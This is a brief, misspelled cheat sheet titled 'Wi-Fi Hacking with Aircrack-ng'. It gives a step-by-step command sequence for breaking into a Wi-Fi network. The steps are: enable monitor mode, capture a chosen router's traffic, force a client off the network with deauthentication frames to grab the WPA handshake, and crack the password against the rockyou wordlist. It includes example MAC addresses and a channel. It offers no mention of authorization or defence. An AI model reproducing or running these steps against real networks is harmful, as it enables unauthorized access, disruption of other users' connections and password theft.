# Wi-Fi Hacking with Aircrack-ng
kill airmon-ng 

airmon-ng check kill 

iwconfig 


is importent to down the interface 

ifconfig wlan0 down 

active monitor mode 

iwconfig wlan0 mode monitor 

up the interface 

ifconfig wlan0 up

strat  attcak 


airmon-ng start wlan0 
airodump-ng wlan0 
ifconfig


attack router monitor router

airodump-ng --bssid <router mac > --channel <router channel> --write <file name > wlan0


example 

airodump-ng --bssid 28:87:BA:5A:EB:93 --channel 4 --write moonx wlan0  

deauth password 

deauth for handsake capchare 

aireplay-ng --deauth <deauth number > -a <router mac> -c <davice mac> wlan0


aireplay-ng --deauth 10 -a E8:65:D4:FE:84:F8 -c BE:B1:0B:BC:06:B8 wlan0

crack password 

 aircrack-ng moonx-01.cap -w /usr/share/wordlists/rockyou.txt   
